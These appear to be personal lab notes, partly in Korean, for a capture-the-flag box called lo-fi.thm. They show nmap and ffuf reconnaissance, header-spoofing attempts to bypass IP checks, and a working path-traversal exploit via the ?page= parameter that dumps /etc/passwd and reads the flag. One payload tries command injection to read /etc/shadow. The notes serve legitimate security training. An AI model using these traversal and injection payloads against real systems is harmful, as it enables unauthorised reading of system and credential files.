Nmap 7.95 scan initiated Sun Jun 8 08:04:11 2025 as: /usr/lib/nmap/nmap -sC -sV -O -oN scan.txt -p- 10.10.126.200
Nmap scan report for 10.10.126.200
Host is up (0.21s latency).
Not shown: 65533 closed tcp ports (reset)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 9d:3d:d7:e4:5f:88:2a:1a:7d:d3:be:ae:ed:ab:ce:89 (RSA)
| 256 ca:99:57:b7:88:38:f7:96:70:48:73:fa:c2:e0:c6:28 (ECDSA)
|\_ 256 7b:6f:41:2a:00:18:b6:a4:12:ce:e1:bd:f2:ce:67:45 (ED25519)
80/tcp open http Apache httpd 2.2.22 ((Ubuntu))
|\_http-title: Lo-Fi Music
|\_http-server-header: Apache/2.2.22 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sun Jun 8 08:30:16 2025 -- 1 IP address (1 host up) scanned in 1565.76 seconds

# ffuf

# -fs Response size 필터입니다. 응답 크기가 정확히 178바이트인 경우 결과에서 제외하겠다는 뜻입니다.

# -H 옵션은 HTTP 헤더 전체를 넣어야 하ㅂ니다

ffuf -u http://10.10.126.200 -H "Host: FUZZ.lofi" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 4162 -t 50

# DNS 경로 검색 방식

ffuf -u http://10.10.126.200/FUZZ -w wordlist.txt

| 목적                          | 헤더 필요 여부 | 예시                              |
| ----------------------------- | -------------- | --------------------------------- |
| 🧠 **서브도메인 (Host 기반)** | ✅ 필요        | `-H "Host: FUZZ.lofi"`            |
| 📁 **경로, 파일 fuzzing**     | ❌ 불필요      | `-u http://target/FUZZ`           |
| 🧭 **DNS 직접 질의**          | ❌ 불필요      | `dig`, `dnsrecon`, `dnsenum` 사용 |

# 중복된 페이지가 나오는 것을 방지

-fs 4162

ffuf -u http://10.10.126.200/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -o ffuf.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : GET
:: URL : http://10.10.126.200/FUZZ
:: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500

---

.html [Status: 403, Size: 286, Words: 21, Lines: 11, Duration: 1285ms]
.htm [Status: 403, Size: 285, Words: 21, Lines: 11, Duration: 5477ms]
. [Status: 200, Size: 4162, Words: 1375, Lines: 128, Duration: 269ms]
.htaccess [Status: 403, Size: 290, Words: 21, Lines: 11, Duration: 403ms]
.htc [Status: 403, Size: 285, Words: 21, Lines: 11, Duration: 291ms]
.html*var_DE [Status: 403, Size: 293, Words: 21, Lines: 11, Duration: 303ms]
server-status [Status: 403, Size: 294, Words: 21, Lines: 11, Duration: 338ms]
.htpasswd [Status: 403, Size: 290, Words: 21, Lines: 11, Duration: 309ms]
.html. [Status: 403, Size: 287, Words: 21, Lines: 11, Duration: 312ms]
.html.html [Status: 403, Size: 291, Words: 21, Lines: 11, Duration: 380ms]
.htpasswds [Status: 403, Size: 291, Words: 21, Lines: 11, Duration: 306ms]
.htm. [Status: 403, Size: 286, Words: 21, Lines: 11, Duration: 406ms]
.htmll [Status: 403, Size: 287, Words: 21, Lines: 11, Duration: 511ms]
.html.old [Status: 403, Size: 290, Words: 21, Lines: 11, Duration: 333ms]
.html.bak [Status: 403, Size: 290, Words: 21, Lines: 11, Duration: 306ms]
.ht [Status: 403, Size: 284, Words: 21, Lines: 11, Duration: 307ms]
.htm.htm [Status: 403, Size: 289, Words: 21, Lines: 11, Duration: 301ms]
.htgroup [Status: 403, Size: 289, Words: 21, Lines: 11, Duration: 303ms]
.html1 [Status: 403, Size: 287, Words: 21, Lines: 11, Duration: 304ms]
.hta [Status: 403, Size: 285, Words: 21, Lines: 11, Duration: 302ms]
.html.LCK [Status: 403, Size: 290, Words: 21, Lines: 11, Duration: 281ms]
.html.printable [Status: 403, Size: 296, Words: 21, Lines: 11, Duration: 288ms]
.htm.LCK [Status: 403, Size: 289, Words: 21, Lines: 11, Duration: 304ms]
.htx [Status: 403, Size: 285, Words: 21, Lines: 11, Duration: 306ms]
.html.php [Status: 403, Size: 290, Words: 21, Lines: 11, Duration: 306ms]
.htaccess.bak [Status: 403, Size: 294, Words: 21, Lines: 11, Duration: 303ms]
.htmls [Status: 403, Size: 287, Words: 21, Lines: 11, Duration: 306ms]
.html- [Status: 403, Size: 287, Words: 21, Lines: 11, Duration: 306ms]
.htm2 [Status: 403, Size: 286, Words: 21, Lines: 11, Duration: 304ms]
.htlm [Status: 403, Size: 286, Words: 21, Lines: 11, Duration: 306ms]
.htuser [Status: 403, Size: 288, Words: 21, Lines: 11, Duration: 304ms]
.html-1 [Status: 403, Size: 288, Words: 21, Lines: 11, Duration: 300ms]
.hts [Status: 403, Size: 285, Words: 21, Lines: 11, Duration: 300ms]
.html.sav [Status: 403, Size: 290, Words: 21, Lines: 11, Duration: 300ms]
.htacess [Status: 403, Size: 289, Words: 21, Lines: 11, Duration: 300ms]
.html_files [Status: 403, Size: 292, Words: 21, Lines: 11, Duration: 299ms]
.htm.old [Status: 403, Size: 289, Words: 21, Lines: 11, Duration: 300ms]
.htmlprint [Status: 403, Size: 291, Words: 21, Lines: 11, Duration: 300ms]
.html.orig [Status: 403, Size: 291, Words: 21, Lines: 11, Duration: 300ms]
.htm.d [Status: 403, Size: 287, Words: 21, Lines: 11, Duration: 300ms]
.html* [Status: 403, Size: 287, Words: 21, Lines: 11, Duration: 298ms]
.htm.html [Status: 403, Size: 290, Words: 21, Lines: 11, Duration: 299ms]
.htmlpar [Status: 403, Size: 289, Words: 21, Lines: 11, Duration: 300ms]
:: Progress: [63088/63088] :: Job [1/1] :: 124 req/sec :: Duration: [0:08:09] :: Errors: 0 ::

# ip 우회

curl -i http://10.10.126.200/.htaccess \
 -H "X-Forwarded-For: 127.0.0.1" \
 -H "X-Real-IP: 127.0.0.1" \
 -H "Client-IP: 127.0.0.1" \
 -H "X-Client-IP: 127.0.0.1" \
 -H "X-Remote-IP: 127.0.0.1" \
 -H "X-Remote-Addr: 127.0.0.1"

# install SEclists

git clone https://github.com/danielmiessler/SecLists.git

# /etc/hosts

echo "10.10.126.200 lo-fi.thm" >> /etc/hosts
echo "10.10.126.200 lo-fi.thm" >> /etc/hosts

cat /etc/hosts

# file traversal

ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://lo-fi.thm/?page=FUZZ" -fl 124 -mc 200

# http

http http://lo-fi.thm/?page=%0a/bin/cat%20/etc/shadow

```html
<div class="alert alert-danger" role="alert"> Sorry, <code>
/bin/cat /etc/shadow</code> does not exist. </div> </div>
</div>
```

http http://lo-fi.thm/?page=
http http://lo-fi.thm/?page=/../../etc/passwd
http http://lo-fi.thm/?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh

# 틀림 -> 절대 경로를 허용하는 경우는 극히 드물다

http http://lo-fi.thm/?page=/../../../../../../../flag.txt

# 맞음 -> 상위 폴더로 이동해야 하므로 일반적으로 .. 로 시작

http http://lo-fi.thm/?page=../../../flag.txt
